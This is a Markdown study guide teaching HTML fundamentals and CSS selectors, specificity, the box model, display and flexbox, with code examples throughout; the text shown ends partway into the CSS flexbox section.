# Complete Study Guide Collection
### HTML · CSS · JavaScript · Python · SQL · Java · PowerShell · CompTIA Tech+ · CompTIA Network+ · CompTIA Security+ · CompTIA PenTest+ · CompTIA Linux+

---

> **How to use this guide:** Each section is a fully self-contained study guide.  
> Use the table of contents below to jump to any topic.

---

## Table of Contents

1. [HTML](#html--complete-study-guide)
2. [CSS](#css--complete-study-guide)
3. [JavaScript (JS)](#javascript-js--complete-study-guide)
4. [Python](#python--complete-study-guide)
5. [SQL](#sql--complete-study-guide)
6. [Java](#java--complete-study-guide)
7. [PowerShell](#powershell--complete-study-guide)
8. [CompTIA Tech+](#comptia-tech-fc0-u71--complete-study-guide)
9. [CompTIA Network+](#comptia-network-n10-009--complete-study-guide)
10. [CompTIA Security+](#comptia-security-sy0-701--complete-study-guide)
11. [CompTIA PenTest+](#comptia-pentest-pt0-003--complete-study-guide)
12. [CompTIA Linux+](#comptia-linux-xk0-005--complete-study-guide)

---

# HTML — Complete Study Guide

---

## 1. What Is HTML?

HTML (HyperText Markup Language) is the standard language used to create and structure content on the web. It is **not** a programming language — it is a **markup language** that describes the structure and meaning of web content using **elements** represented by **tags**.

Every webpage you visit is built on HTML. Browsers (Chrome, Firefox, Safari) parse HTML files and render them visually. HTML works alongside **CSS** (for styling) and **JavaScript** (for behavior).

---

## 2. HTML Document Structure

Every HTML file follows a standard structure:

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>My First Page</title>
  </head>
  <body>
    <h1>Hello, World!</h1>
    <p>This is my first webpage.</p>
  </body>
</html>
```

| Part | Purpose |
|------|---------|
| `<!DOCTYPE html>` | Tells the browser this is an HTML5 document |
| `<html lang="en">` | Root element; `lang` helps screen readers and SEO |
| `<head>` | Metadata — not visible on page |
| `<meta charset="UTF-8">` | Character encoding (supports all languages) |
| `<meta name="viewport">` | Makes page responsive on mobile |
| `<title>` | Text shown on browser tab |
| `<body>` | All visible content goes here |

---

## 3. HTML Elements, Tags, and Attributes

### Anatomy of an Element

```
<tagname attribute="value"> Content </tagname>
   ^         ^        ^         ^         ^
Opening   Attr.   Attr.     Content   Closing
  tag      name   value                 tag
```

### Self-Closing (Void) Elements

Some elements have no content and no closing tag:

```html
<img src="photo.jpg" alt="A photo" />
<br />
<hr />
<input type="text" />
<meta charset="UTF-8" />
<link rel="stylesheet" href="style.css" />
```

### Global Attributes (work on any element)

| Attribute | Description |
|-----------|-------------|
| `id` | Unique identifier for one element |
| `class` | One or more class names (space-separated) |
| `style` | Inline CSS styles |
| `title` | Tooltip text on hover |
| `lang` | Language of the element's content |
| `tabindex` | Tab order for keyboard navigation |
| `hidden` | Hides the element |
| `data-*` | Custom data attributes (`data-user-id="42"`) |
| `aria-*` | Accessibility attributes |
| `contenteditable` | Makes element editable by user |

---

## 4. Text Content Elements

### Headings

```html
<h1>Main Title (only one per page ideally)</h1>
<h2>Section Title</h2>
<h3>Subsection</h3>
<h4>Sub-subsection</h4>
<h5>Rarely used</h5>
<h6>Smallest heading</h6>
```

Headings are **semantic** — they communicate importance to browsers, search engines, and screen readers, not just size.

### Paragraphs and Line Breaks

```html
<p>This is a paragraph. Browsers collapse whitespace automatically.</p>
<p>Second paragraph — browsers add margin between paragraphs by default.</p>
<br /> <!-- Line break — use sparingly -->
<hr /> <!-- Thematic break / horizontal rule -->
```

### Inline Text Formatting

```html
<strong>Bold/important text</strong>       <!-- Semantic importance -->
<b>Bold text</b>                           <!-- Visual only, no meaning -->
<em>Italic/emphasized text</em>            <!-- Semantic emphasis -->
<i>Italic text</i>                         <!-- Visual only -->
<u>Underlined</u>
<s>Strikethrough</s>
<mark>Highlighted text</mark>
<small>Fine print / smaller text</small>
<sup>Superscript</sup>  <!-- e.g., x<sup>2</sup> = x² -->
<sub>Subscript</sub>    <!-- e.g., H<sub>2</sub>O -->
<code>inline code</code>
<pre><code>
  preformatted block code
  preserves whitespace
</code></pre>
<kbd>Ctrl+C</kbd>        <!-- Keyboard input -->
<var>x</var>             <!-- Variable in math/code -->
<abbr title="HyperText Markup Language">HTML</abbr>
<cite>Book Title</cite>
<q>Inline quotation</q>
<blockquote cite="https://source.com">Long quotation</blockquote>
<time datetime="2024-01-15">January 15, 2024</time>
<address>Contact info block</address>
```

---

## 5. Lists

### Unordered List (bullets)

```html
<ul>
  <li>Apples</li>
  <li>Bananas</li>
  <li>Cherries</li>
</ul>
```

### Ordered List (numbered)

```html
<ol type="1" start="3">   <!-- type: 1, A, a, I, i -->
  <li>First item (starts at 3)</li>
  <li>Second item</li>
</ol>
```

### Description List (key-value pairs)

```html
<dl>
  <dt>HTML</dt>
  <dd>HyperText Markup Language</dd>
  <dt>CSS</dt>
  <dd>Cascading Style Sheets</dd>
</dl>
```

### Nested Lists

```html
<ul>
  <li>Fruits
    <ul>
      <li>Citrus
        <ul>
          <li>Orange</li>
          <li>Lemon</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>
```

---

## 6. Links and Navigation

### Basic Link

```html
<a href="https://www.example.com">Visit Example</a>
```

### Link Attributes

| Attribute | Values | Description |
|-----------|--------|-------------|
| `href` | URL, `#id`, `mailto:`, `tel:` | Destination |
| `target` | `_blank`, `_self`, `_parent`, `_top` | Where to open |
| `rel` | `noopener noreferrer`, `nofollow` | Relationship |
| `download` | filename | Forces download |
| `title` | text | Tooltip on hover |

```html
<!-- External link in new tab (always use noopener for security) -->
<a href="https://example.com" target="_blank" rel="noopener noreferrer">
  External Site
</a>

<!-- Internal anchor (jumps to element with id="section2") -->
<a href="#section2">Jump to Section 2</a>
<h2 id="section2">Section 2</h2>

<!-- Email link -->
<a href="mailto:user@example.com?subject=Hello&body=Hi there">Email Me</a>

<!-- Phone link -->
<a href="tel:+15551234567">Call Us</a>

<!-- Download link -->
<a href="file.pdf" download="my-document.pdf">Download PDF</a>

<!-- Back to top -->
<a href="#">Back to Top</a>
```

---

## 7. Images and Media

### Images

```html
<img 
  src="photo.jpg"          <!-- Required: file path or URL -->
  alt="A mountain at sunset"  <!-- Required: describes image for accessibility -->
  width="800"              <!-- Optional: in pixels -->
  height="600"             <!-- Optional: helps prevent layout shift -->
  loading="lazy"           <!-- Defer loading until near viewport -->
  decoding="async"
/>
```

**Always provide `alt` text.** Empty `alt=""` tells screen readers the image is decorative.

### Responsive Images

```html
<!-- srcset: offer multiple sizes; browser picks best -->
<img 
  src="image-800.jpg"
  srcset="image-400.jpg 400w, image-800.jpg 800w, image-1600.jpg 1600w"
  sizes="(max-width: 600px) 400px, (max-width: 1200px) 800px, 1600px"
  alt="Responsive image example"
/>

<!-- picture: different image formats or art direction -->
<picture>
  <source srcset="image.avif" type="image/avif" />
  <source srcset="image.webp" type="image/webp" />
  <img src="image.jpg" alt="Fallback image" />
</picture>
```

### Figure and Figcaption

```html
<figure>
  <img src="chart.png" alt="Bar chart showing sales data" />
  <figcaption>Figure 1: Annual sales by region (2023)</figcaption>
</figure>
```

### Audio

```html
<audio controls autoplay loop muted preload="auto">
  <source src="audio.mp3" type="audio/mpeg" />
  <source src="audio.ogg" type="audio/ogg" />
  Your browser does not support the audio element.
</audio>
```

### Video

```html
<video 
  width="1280" 
  height="720" 
  controls 
  autoplay 
  loop 
  muted 
  poster="thumbnail.jpg"
  preload="metadata"
>
  <source src="video.mp4" type="video/mp4" />
  <source src="video.webm" type="video/webm" />
  <track src="captions.vtt" kind="subtitles" srclang="en" label="English" />
  Your browser does not support video.
</video>
```

### Embedding External Content

```html
<!-- YouTube embed -->
<iframe 
  width="560" 
  height="315" 
  src="https://www.youtube.com/embed/VIDEO_ID" 
  title="Video title"
  frameborder="0" 
  allow="accelerometer; autoplay; clipboard-write; encrypted-media"
  allowfullscreen
></iframe>

<!-- Google Map embed -->
<iframe
  src="https://www.google.com/maps/embed?pb=..."
  width="600"
  height="450"
  allowfullscreen=""
  loading="lazy"
></iframe>
```

---

## 8. Tables

Tables are for **tabular data** — not for layout!

```html
<table>
  <caption>Monthly Revenue</caption>        <!-- Accessible title -->
  <thead>
    <tr>
      <th scope="col">Month</th>
      <th scope="col">Revenue</th>
      <th scope="col">Growth</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>January</td>
      <td>$10,000</td>
      <td>+5%</td>
    </tr>
    <tr>
      <td>February</td>
      <td>$12,000</td>
      <td>+20%</td>
    </tr>
  </tbody>
  <tfoot>
    <tr>
      <td>Total</td>
      <td>$22,000</td>
      <td>+12.5%</td>
    </tr>
  </tfoot>
</table>
```

### Spanning Cells

```html
<td colspan="2">Spans 2 columns</td>
<td rowspan="3">Spans 3 rows</td>
```

---

## 9. Forms

Forms collect user input and send it to a server.

### Complete Form Example

```html
<form action="/submit" method="POST" enctype="multipart/form-data" novalidate>

  <!-- Text fields -->
  <label for="name">Full Name *</label>
  <input type="text" id="name" name="name" 
         required minlength="2" maxlength="50"
         placeholder="John Doe" autocomplete="name" />

  <label for="email">Email Address</label>
  <input type="email" id="email" name="email" 
         placeholder="john@example.com" autocomplete="email" />

  <label for="password">Password</label>
  <input type="password" id="password" name="password" 
         minlength="8" autocomplete="new-password" />

  <label for="phone">Phone Number</label>
  <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" />

  <label for="website">Website</label>
  <input type="url" id="website" name="website" />

  <label for="age">Age</label>
  <input type="number" id="age" name="age" min="0" max="120" step="1" />

  <label for="birthday">Birthday</label>
  <input type="date" id="birthday" name="birthday" />

  <!-- Range slider -->
  <label for="volume">Volume: <output id="vol-out">50</output></label>
  <input type="range" id="volume" name="volume" min="0" max="100" value="50"
         oninput="document.getElementById('vol-out').value = this.value" />

  <!-- Color picker -->
  <label for="fav-color">Favorite Color</label>
  <input type="color" id="fav-color" name="fav_color" value="#ff0000" />

  <!-- Textarea -->
  <label for="message">Message</label>
  <textarea id="message" name="message" rows="5" cols="40"
            placeholder="Write your message here..." maxlength="500"></textarea>

  <!-- Select (dropdown) -->
  <label for="country">Country</label>
  <select id="country" name="country" required>
    <option value="">-- Select a country --</option>
    <optgroup label="North America">
      <option value="us">United States</option>
      <option value="ca">Canada</option>
    </optgroup>
    <optgroup label="Europe">
      <option value="uk">United Kingdom</option>
      <option value="de">Germany</option>
    </optgroup>
  </select>

  <!-- Multi-select -->
  <select id="skills" name="skills" multiple size="4">
    <option value="html">HTML</option>
    <option value="css">CSS</option>
    <option value="js">JavaScript</option>
    <option value="python">Python</option>
  </select>

  <!-- Radio buttons -->
  <fieldset>
    <legend>Gender</legend>
    <label><input type="radio" name="gender" value="male" /> Male</label>
    <label><input type="radio" name="gender" value="female" /> Female</label>
    <label><input type="radio" name="gender" value="other" /> Other</label>
  </fieldset>

  <!-- Checkboxes -->
  <fieldset>
    <legend>Interests</legend>
    <label><input type="checkbox" name="interests" value="tech" checked /> Technology</label>
    <label><input type="checkbox" name="interests" value="music" /> Music</label>
    <label><input type="checkbox" name="interests" value="sports" /> Sports</label>
  </fieldset>

  <!-- File upload -->
  <label for="avatar">Profile Picture</label>
  <input type="file" id="avatar" name="avatar" 
         accept="image/*" multiple />

  <!-- Hidden field -->
  <input type="hidden" name="csrf_token" value="abc123" />

  <!-- Datalist (autocomplete suggestions) -->
  <label for="browser">Preferred Browser</label>
  <input type="text" id="browser" name="browser" list="browsers" />
  <datalist id="browsers">
    <option value="Chrome">
    <option value="Firefox">
    <option value="Safari">
    <option value="Edge">
  </datalist>

  <!-- Submit options -->
  <button type="submit">Submit Form</button>
  <button type="reset">Reset</button>
  <button type="button" onclick="doSomething()">Custom Action</button>
  <input type="submit" value="Alternative Submit" />

</form>
```

### Form Attributes Summary

| Attribute | Description |
|-----------|-------------|
| `action` | URL where form data is sent |
| `method` | `GET` (data in URL) or `POST` (data in body) |
| `enctype` | `multipart/form-data` for file uploads |
| `novalidate` | Skip browser validation |
| `autocomplete` | Enable/disable autofill |

### Input Types Reference

`text`, `email`, `password`, `number`, `tel`, `url`, `date`, `time`, `datetime-local`, `month`, `week`, `color`, `range`, `file`, `checkbox`, `radio`, `submit`, `reset`, `button`, `hidden`, `search`, `image`

---

## 10. Semantic HTML5 Elements

Semantic elements describe **meaning**, not just appearance. They help SEO, accessibility, and code readability.

```html
<!DOCTYPE html>
<html lang="en">
<head>...</head>
<body>

  <header>
    <!-- Site header: logo, main navigation -->
    <nav aria-label="Main navigation">
      <ul>
        <li><a href="/">Home</a></li>
        <li><a href="/about">About</a></li>
        <li><a href="/contact">Contact</a></li>
      </ul>
    </nav>
  </header>

  <main>
    <!-- Primary content of the page (only one per page) -->

    <article>
      <!-- Independent, self-contained content (blog post, news article) -->
      <header>
        <h1>Article Title</h1>
        <time datetime="2024-01-15">January 15, 2024</time>
        <address>By <a href="/author">Jane Doe</a></address>
      </header>

      <section>
        <!-- Thematic grouping within content -->
        <h2>Introduction</h2>
        <p>Content here...</p>
      </section>

      <section>
        <h2>Main Body</h2>
        <p>More content...</p>

        <aside>
          <!-- Tangentially related content (sidebar, callout) -->
          <h3>Related Info</h3>
          <p>Side note here...</p>
        </aside>
      </section>

      <footer>
        <!-- Article-level footer: tags, author bio, share buttons -->
        <p>Tags: <a href="/tag/html">HTML</a></p>
      </footer>
    </article>

  </main>

  <aside>
    <!-- Site-level sidebar -->
    <h2>Recent Posts</h2>
    <ul>...</ul>
  </aside>

  <footer>
    <!-- Site-wide footer -->
    <p>&copy; 2024 My Website. All rights reserved.</p>
    <nav aria-label="Footer navigation">
      <a href="/privacy">Privacy Policy</a>
      <a href="/terms">Terms of Service</a>
    </nav>
  </footer>

</body>
</html>
```

### Semantic vs Non-Semantic

| Semantic | Non-Semantic | Use When |
|----------|-------------|----------|
| `<header>` | `<div id="header">` | Site or section header |
| `<nav>` | `<div id="nav">` | Navigation links |
| `<main>` | `<div id="main">` | Primary page content |
| `<article>` | `<div class="post">` | Independent content |
| `<section>` | `<div class="section">` | Thematic grouping |
| `<aside>` | `<div class="sidebar">` | Supplementary content |
| `<footer>` | `<div id="footer">` | Footer content |
| `<figure>` | `<div class="figure">` | Images with captions |
| `<time>` | `<span>` | Dates and times |
| `<mark>` | `<span class="highlight">` | Highlighted text |

---

## 11. Div and Span (Non-Semantic Containers)

```html
<!-- Block-level container: use when no semantic element fits -->
<div class="card">
  <div class="card-header">Title</div>
  <div class="card-body">Content</div>
</div>

<!-- Inline container: use for styling a portion of text -->
<p>My favorite color is <span class="highlight">blue</span> because it's calming.</p>
```

---

## 12. HTML Metadata and the `<head>`

```html
<head>
  <!-- Character encoding -->
  <meta charset="UTF-8" />

  <!-- Viewport for responsive design -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- SEO meta tags -->
  <meta name="description" content="Page description (150-160 chars ideal)" />
  <meta name="keywords" content="html, web, tutorial" />
  <meta name="author" content="John Doe" />
  <meta name="robots" content="index, follow" />

  <!-- Open Graph (Facebook, LinkedIn sharing) -->
  <meta property="og:title" content="Page Title" />
  <meta property="og:description" content="Page description" />
  <meta property="og:image" content="https://site.com/image.jpg" />
  <meta property="og:url" content="https://site.com/page" />
  <meta property="og:type" content="website" />

  <!-- Twitter Cards -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Page Title" />
  <meta name="twitter:description" content="Description" />
  <meta name="twitter:image" content="https://site.com/image.jpg" />

  <!-- Canonical URL (avoid duplicate content) -->
  <link rel="canonical" href="https://example.com/page/" />

  <!-- Favicon -->
  <link rel="icon" type="image/png" href="/favicon.png" />
  <link rel="apple-touch-icon" href="/apple-touch-icon.png" />

  <!-- CSS Stylesheets -->
  <link rel="stylesheet" href="style.css" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto" />

  <!-- Preloading for performance -->
  <link rel="preload" href="font.woff2" as="font" type="font/woff2" crossorigin />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="dns-prefetch" href="//cdn.example.com" />

  <!-- Page title -->
  <title>Page Title | Site Name</title>

  <!-- Inline CSS (avoid; prefer external file) -->
  <style>
    body { font-family: sans-serif; }
  </style>

  <!-- JavaScript (defer = run after HTML parsed; async = run as soon as downloaded) -->
  <script src="script.js" defer></script>
  <script src="analytics.js" async></script>
</head>
```

---

## 13. HTML Entities and Special Characters

| Character | Entity Name | Entity Number |
|-----------|-------------|---------------|
| `<` | `&lt;` | `&#60;` |
| `>` | `&gt;` | `&#62;` |
| `&` | `&amp;` | `&#38;` |
| `"` | `&quot;` | `&#34;` |
| `'` | `&apos;` | `&#39;` |
| Non-breaking space | `&nbsp;` | `&#160;` |
| © | `&copy;` | `&#169;` |
| ® | `&reg;` | `&#174;` |
| ™ | `&trade;` | `&#8482;` |
| → | `&rarr;` | `&#8594;` |
| ← | `&larr;` | `&#8592;` |
| ♥ | `&hearts;` | `&#9829;` |
| € | `&euro;` | `&#8364;` |
| £ | `&pound;` | `&#163;` |

---

## 14. Accessibility (A11y)

```html
<!-- Use semantic HTML first — it's inherently accessible -->

<!-- ARIA roles when semantic HTML isn't enough -->
<div role="alert">Error: Field is required</div>
<div role="dialog" aria-labelledby="dialog-title" aria-modal="true">
  <h2 id="dialog-title">Confirm Action</h2>
  ...
</div>

<!-- ARIA labels -->
<button aria-label="Close dialog">×</button>
<nav aria-label="Breadcrumb">...</nav>

<!-- Describe elements with aria-describedby -->
<input id="email" aria-describedby="email-hint" />
<span id="email-hint">Enter your work email address</span>

<!-- Live regions for dynamic content -->
<div aria-live="polite">Status: Loading...</div>
<div aria-live="assertive">Critical: Error occurred!</div>

<!-- Skip navigation for keyboard users -->
<a href="#main-content" class="skip-link">Skip to main content</a>

<!-- Images -->
<img src="logo.png" alt="Company Name" />             <!-- Informative -->
<img src="decoration.png" alt="" role="presentation" /> <!-- Decorative -->

<!-- Hidden from screen readers but visible -->
<span aria-hidden="true">★★★★☆</span>
<span class="sr-only">4 out of 5 stars</span>

<!-- Tab order -->
<div tabindex="0">Focusable div</div>       <!-- In normal tab order -->
<div tabindex="-1">Focusable via JS only</div>
```

### The 4 POUR Principles of Accessibility

1. **Perceivable** — Information must be presentable in ways users can perceive (alt text, captions)
2. **Operable** — Interface must be operable (keyboard navigation, no seizure-inducing content)
3. **Understandable** — Content must be understandable (clear language, predictable behavior)
4. **Robust** — Content must be interpreted by various assistive technologies

---

## 15. HTML Comments and Best Practices

```html
<!-- This is an HTML comment — not visible in browser -->

<!--
  Multi-line comment
  Useful for temporarily disabling code
-->
```

### Best Practices Checklist

- ✅ Always include `<!DOCTYPE html>`
- ✅ Set `lang` attribute on `<html>`
- ✅ Include `charset` and `viewport` meta tags
- ✅ Use semantic elements over generic `div`/`span`
- ✅ Always provide `alt` text for images
- ✅ Associate labels with inputs using `for`/`id`
- ✅ Use `<button>` for buttons (not `<div>` or `<a>`)
- ✅ Validate HTML at [validator.w3.org](https://validator.w3.org)
- ✅ Keep markup clean and well-indented
- ✅ Don't use deprecated elements (`<font>`, `<center>`, `<marquee>`)
- ✅ Test with keyboard-only navigation
- ✅ Test with a screen reader (NVDA, VoiceOver)

---

## 16. HTML5 APIs Overview

HTML5 introduced built-in browser APIs:

| API | Purpose |
|-----|---------|
| Canvas API | Draw 2D graphics with `<canvas>` |
| Geolocation API | Get user's location |
| Web Storage | localStorage, sessionStorage |
| Web Workers | Background threads |
| WebSockets | Real-time communication |
| Drag and Drop | Native drag-and-drop |
| History API | Manipulate browser history |
| File API | Read local files |
| Notifications API | Show desktop notifications |
| Service Workers | Offline support (PWAs) |

---

## 17. Common HTML Interview Questions

**Q: What's the difference between `id` and `class`?**
A: `id` must be unique per page and is used to identify a single element. `class` can be reused on multiple elements and is for styling groups.

**Q: What is the difference between `<b>` and `<strong>`?**
A: Both appear bold visually, but `<strong>` has semantic meaning (important), while `<b>` is purely visual. Screen readers may emphasize `<strong>` differently.

**Q: What is a void/self-closing element?**
A: Elements with no content and no closing tag: `<img>`, `<input>`, `<br>`, `<hr>`, `<meta>`, `<link>`.

**Q: What is the difference between `GET` and `POST` in forms?**
A: `GET` sends data in the URL (visible, cached, limited size — good for searches). `POST` sends data in the request body (not visible in URL, no size limit, better for sensitive data).

**Q: What are data attributes?**
A: Custom attributes prefixed with `data-` that store extra information: `<div data-user-id="42">`. Accessed in JS via `element.dataset.userId`.

**Q: What does `defer` vs `async` do on script tags?**
A: Both load the script without blocking HTML parsing. `defer` executes scripts in order after HTML is fully parsed. `async` executes as soon as downloaded, in any order.

---

*End of HTML Study Guide*


---

# CSS — Complete Study Guide

---

## 1. What Is CSS?

CSS (Cascading Style Sheets) controls the **visual presentation** of HTML elements. While HTML defines structure and meaning, CSS defines color, layout, spacing, typography, animation, and responsiveness.

The "cascading" in CSS refers to how styles are applied: when multiple rules target the same element, a priority system (the **cascade**) determines which styles win.

---

## 2. Adding CSS to HTML

### Inline (least preferred)
```html
<p style="color: red; font-size: 18px;">Inline styles</p>
```

### Internal (in `<head>`)
```html
<style>
  p { color: red; }
</style>
```

### External (preferred)
```html
<link rel="stylesheet" href="styles.css" />
```

---

## 3. CSS Syntax

```css
selector {
  property: value;   /* declaration */
  property: value;
}
```

```css
/* This is a CSS comment */

/* Multiple selectors with same rules */
h1, h2, h3 {
  font-family: sans-serif;
  color: #333;
}
```

---

## 4. Selectors (The Core of CSS)

### Basic Selectors

```css
/* Universal: selects ALL elements */
* { box-sizing: border-box; }

/* Type/Element: all <p> elements */
p { color: gray; }

/* Class: any element with class="card" */
.card { border: 1px solid #ccc; }

/* ID: the ONE element with id="header" */
#header { background: navy; }

/* Attribute: elements with that attribute */
[type="text"] { border: 1px solid blue; }
[href^="https"] { color: green; }    /* href starts with https */
[href$=".pdf"] { color: red; }       /* href ends with .pdf */
[class*="btn"] { cursor: pointer; }  /* class contains "btn" */
[data-active] { font-weight: bold; } /* has data-active attr */
```

### Combinators

```css
/* Descendant: all <p> inside .container (any depth) */
.container p { margin: 0; }

/* Child: only DIRECT <li> children of <ul> */
ul > li { list-style: disc; }

/* Adjacent sibling: <p> that comes immediately after <h2> */
h2 + p { font-size: 1.1em; }

/* General sibling: all <p> elements that follow an <h2> */
h2 ~ p { color: #555; }
```

### Pseudo-Classes (element state)

```css
a:link      { color: blue; }      /* Unvisited link */
a:visited   { color: purple; }    /* Visited link */
a:hover     { color: red; }       /* Mouse over */
a:active    { color: orange; }    /* Being clicked */
a:focus     { outline: 2px solid blue; } /* Keyboard focused */

button:disabled { opacity: 0.5; cursor: not-allowed; }
input:checked   { accent-color: green; }
input:valid     { border-color: green; }
input:invalid   { border-color: red; }
input:required  { border-left: 3px solid red; }
input:optional  { border-left: 3px solid gray; }
input:focus-within { background: #f0f8ff; }  /* Self or child focused */

/* Structural pseudo-classes */
li:first-child   { font-weight: bold; }
li:last-child    { border-bottom: none; }
li:nth-child(2)  { background: #eee; }         /* Exactly 2nd */
li:nth-child(odd)  { background: #f9f9f9; }    /* 1, 3, 5... */
li:nth-child(even) { background: #fff; }       /* 2, 4, 6... */
li:nth-child(3n)   { color: red; }             /* Every 3rd */
li:nth-child(2n+1) { color: blue; }            /* Same as odd */
li:first-of-type { ... }  /* First <li> of its type in parent */
li:last-of-type  { ... }
li:nth-of-type(2) { ... }
p:only-child     { ... }   /* Only element in its parent */
p:only-of-type   { ... }
:not(.active)    { opacity: 0.7; }   /* Negation */
:is(h1, h2, h3) { color: navy; }    /* Matches any in list */
:where(h1, h2)  { margin: 0; }      /* Like :is but 0 specificity */
:has(img)        { border: 1px solid; } /* Parent that has img child */

/* Empty and not-empty */
p:empty          { display: none; }
```

### Pseudo-Elements (virtual elements)

```css
p::before {
  content: "→ ";
  color: red;
}

p::after {
  content: " ✓";
}

p::first-line    { font-weight: bold; }
p::first-letter  { font-size: 3em; float: left; }

input::placeholder { color: #aaa; font-style: italic; }
::selection { background: yellow; color: black; }
::marker    { color: red; }  /* List bullet/number */
```

---

## 5. The Cascade, Specificity, and Inheritance

### Cascade Order (lower → higher priority)
1. Browser default styles
2. External stylesheets
3. Internal `<style>` block
4. Inline `style` attribute
5. `!important` declarations

### Specificity Calculation

Specificity is scored as `(A, B, C, D)`:

| Selector | A | B | C | D | Score |
|----------|---|---|---|---|-------|
| `*` | 0 | 0 | 0 | 0 | 0 |
| `p` | 0 | 0 | 0 | 1 | 1 |
| `.class` | 0 | 0 | 1 | 0 | 10 |
| `#id` | 0 | 1 | 0 | 0 | 100 |
| Inline style | 1 | 0 | 0 | 0 | 1000 |
| `!important` | Overrides everything | | | | ∞ |

```css
/* Specificity examples */
p            { color: black; }    /* 0,0,0,1 */
.intro       { color: blue; }     /* 0,0,1,0 — wins over p */
#main        { color: green; }    /* 0,1,0,0 — wins over .intro */
p.intro#main { color: red; }      /* 0,1,1,1 — most specific */
p { color: pink !important; }     /* !important — beats everything */
```

### Inheritance

Some properties **inherit** from parent to child automatically:
- Color, font-*, text-*, line-height, visibility, cursor

Some properties do **not** inherit:
- Width, height, margin, padding, border, background, display, position

```css
/* Control inheritance explicitly */
p { color: inherit; }     /* Force inherit from parent */
p { color: initial; }     /* Reset to browser default */
p { color: unset; }       /* Inherit if inheritable, else initial */
p { color: revert; }      /* Roll back to browser stylesheet */
```

---

## 6. The Box Model

Every element is a rectangular box consisting of:

```
┌──────────────────────────────────┐
│            MARGIN                │
│  ┌────────────────────────────┐  │
│  │          BORDER            │  │
│  │  ┌──────────────────────┐  │  │
│  │  │       PADDING        │  │  │
│  │  │  ┌────────────────┐  │  │  │
│  │  │  │    CONTENT     │  │  │  │
│  │  │  │  width x height│  │  │  │
│  │  │  └────────────────┘  │  │  │
│  │  └──────────────────────┘  │  │
│  └────────────────────────────┘  │
└──────────────────────────────────┘
```

```css
.box {
  /* Content dimensions */
  width: 200px;
  height: 100px;
  min-width: 100px;
  max-width: 500px;
  min-height: 50px;
  max-height: 300px;

  /* Padding (inside border) */
  padding: 10px;                    /* All sides */
  padding: 10px 20px;               /* top/bottom left/right */
  padding: 10px 15px 20px 25px;     /* top right bottom left */
  padding-top: 10px;
  padding-right: 20px;
  padding-bottom: 10px;
  padding-left: 20px;

  /* Border */
  border: 2px solid black;
  border: 2px dashed red;
  border: 2px dotted blue;
  border-top: 3px double green;
  border-radius: 10px;              /* Rounded corners */
  border-radius: 50%;               /* Circle (if square) */
  border-radius: 10px 20px 30px 40px; /* top-left, top-right, bottom-right, bottom-left */

  /* Margin (outside border) */
  margin: 20px;
  margin: 10px auto;                /* Center horizontally */
  margin-top: 20px;

  /* Auto collapsing: adjacent vertical margins collapse to the larger value */
}

/* Box model modes */
.content-box {
  box-sizing: content-box;   /* Default: width = content only */
  /* Total width = width + padding + border */
}

.border-box {
  box-sizing: border-box;    /* Recommended: width includes padding + border */
  /* Total width = width (padding/border eat INTO width) */
}

/* Global best practice */
*, *::before, *::after {
  box-sizing: border-box;
}
```

---

## 7. Display Property

```css
/* Block: full width, starts new line */
div, p, h1-h6, ul, ol, li, section, article { display: block; }

/* Inline: flows with text, no width/height */
span, a, strong, em { display: inline; }

/* Inline-block: flows with text BUT accepts width/height */
.badge { display: inline-block; width: 80px; text-align: center; }

/* None: removed from page (not just invisible) */
.hidden { display: none; }

/* Flex: flexbox container */
.flex-container { display: flex; }

/* Grid: grid container */
.grid-container { display: grid; }

/* Table display types */
table { display: table; }
tr    { display: table-row; }
td    { display: table-cell; }

/* List item */
li { display: list-item; }
```

---

## 8. Flexbox (1-Dimensional Layout)

Flexbox is for laying out items in a **row or column**.

### Container Properties

```css
.flex-container {
  display: flex;                         /* or inline-flex */

  /* Main axis direction */
  flex-direction: row;                   /* → (default) */
  flex-direction: row-reverse;           /* ← */
  flex-direction: column;                /* ↓ */
  flex-direction: column-reverse;        /* ↑ */

  /* Wrap behavior */
  flex-wrap: nowrap;                     /* Single line (default) */
  flex-wrap: wrap;                       /* Multi-line */
  flex-wrap: wrap-reverse;              /* Multi-line reversed */

  /* Shorthand */
  flex-flow: row wrap;

  /* Alignment on MAIN axis (horizontal for row) */
  justify-content: flex-start;           /* Pack to start (default) */
  justify-content: flex-end;             /* Pack to end */
  justify-content: center;               /* Center */
  justify-content: space-between;        /* First/last at edges */
  justify-content: space-around;         /* Equal space around each */
  justify-content: space-evenly;         /* Perfectly equal spacing */

  /* Alignment on CROSS axis (vertical for row) */
  align-items: stretch;                  /* Fill container (default) */
  align-items: flex-start;              /* Top */
  align-items: flex-end;                /* Bottom */
  align-items: center;                   /* Center */
  align-items: baseline;                 /* Text baseline */

  /* Alignment of wrapped lines */
  align-content: flex-start;
  align-content: flex-end;
  align-content: center;
  align-content: space-between;
  align-content: space-around;
  align-content: stretch;               /* Default */

  /* Gap between items */
  gap: 20px;                            /* row-gap and column-gap */
  gap: 20px 10px;                       /* row-gap column-gap */
  row-gap: 20px;
  column-gap: 10px;
}
```

### Item Properties

```css
.flex-item {
  /* Order (default 0; lower = first) */
  order: 0;
  order: -1;   /* Move before siblings */
  order: 1;    /* Move after siblings */

  /* Grow: how much item grows to fill space */
  flex-grow: 0;    /* Don't grow (default) */
  flex-grow: 1;    /* Grow equally with siblings */
  flex-grow: 2;    /* Grow twice as fast as flex-grow:1 */

  /* Shrink: how much item shrinks when space is tight */
  flex-shrink: 1;  /* Shrink equally (default) */
  flex-shrink: 0;  /* Never shrink */

  /* Basis: initial size before grow/shrink */
  flex-basis: auto;    /* Use item's content size (default) */
  flex-basis: 200px;   /* Fixed starting size */
  flex-basis: 25%;     /* Percentage of container */

  /* Shorthand: flex: grow shrink basis */
  flex: 1;            /* flex: 1 1 0 */
  flex: auto;         /* flex: 1 1 auto */
  flex: none;         /* flex: 0 0 auto — don't grow or shrink */
  flex: 0 0 200px;    /* Fixed 200px, no grow/shrink */

  /* Self alignment (overrides align-items) */
  align-self: auto;
  align-self: flex-start;
  align-self: flex-end;
  align-self: center;
